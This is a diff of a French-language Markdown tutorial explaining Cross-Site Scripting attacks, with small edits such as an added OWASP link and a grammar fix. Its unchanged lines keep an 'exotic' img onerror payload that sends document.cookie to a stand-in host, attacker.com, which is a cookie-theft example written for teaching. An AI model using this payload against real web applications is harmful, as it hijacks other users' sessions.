@@ -9,7 +9,7 @@ lang: fr
 ## Qu'est ce qu'une XSS ?
 
 ### Introduction
-L'attaque par Cross-Site Scripting, communément appelée XSS, est une attaque qui est pratiquée sur des applications web. Elle est actuellement une attaque dévastatrice et à prendre au sérieux (3ᵉ du top 10 OWASP) 🫨🫨. Cette technique exploite les entrées utilisateurs qui ne sont pas désinfectées par le développeur. On va donc passer par des requêtes HTTP GET/POST pour injecter nos payloads et pouvoir toucher les autres utilisateurs.
+L'attaque par Cross-Site Scripting, communément appelée XSS, est une attaque qui est pratiquée sur des applications web. Elle est actuellement une attaque dévastatrice et à prendre au sérieux ([3ᵉ du top 10 OWASP](https://owasp.org/Top10/fr/)) 😱😱. Cette technique exploite les entrées utilisateurs qui ne sont pas désinfectées par le développeur. On va donc passer par des requêtes HTTP GET/POST pour injecter nos payloads et pouvoir toucher les autres utilisateurs.
 
 Il existe trois variantes principales de cette attaque :
 
@@ -119,6 +119,7 @@ while ($row = $results->fetchArray()) {
 ```
 
 Ici la première partie du code PHP intègre le commentaire à la base de données. Puis la seconde partie affiche tout les commentaires.
+Comme pour les autres variantes, dès qu'un utilisateur affichera la page, le code malveillant sera exécuté.
 
 ### Payloads exotiques
 
@@ -127,7 +128,7 @@ Par exemple celui-ci :
 
 ```<img src/onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie;>```
 
-Ce payload ajoute une balise image aux DOM qui n'a pas de source ce qui appellera onerror et lancera notre script.
+Ce payload ajoute une balise image au DOM qui n'a pas de source ce qui appellera onerror et lancera notre script.
 
 Ou encore ce payload : 
 
